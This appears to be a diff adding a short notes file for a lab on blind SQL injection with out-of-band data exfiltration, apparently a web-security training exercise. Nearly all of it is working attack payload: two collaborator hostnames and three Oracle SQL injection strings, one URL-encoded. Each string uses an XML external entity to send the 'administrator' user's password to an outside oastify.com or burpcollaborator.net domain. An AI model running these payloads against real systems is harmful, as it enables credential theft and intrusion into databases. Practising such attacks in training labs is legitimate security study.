@@ -1,0 +1,11 @@
+#Blind SQL injection with out-of-band data exfiltration
+
+w74negweei0d8h0p2krladoaj1psdi17.oastify.com
+m3qda6s4a8w347wfyanb63k0frli99xy.oastify.com
+
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.m3qda6s4a8w347wfyanb63k0frli99xy.oastify.com/"> %remote;]>'),'/l') FROM dual)-- 
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
+
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.jf2am341m580g48ca7z8i0wxroxhl89x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
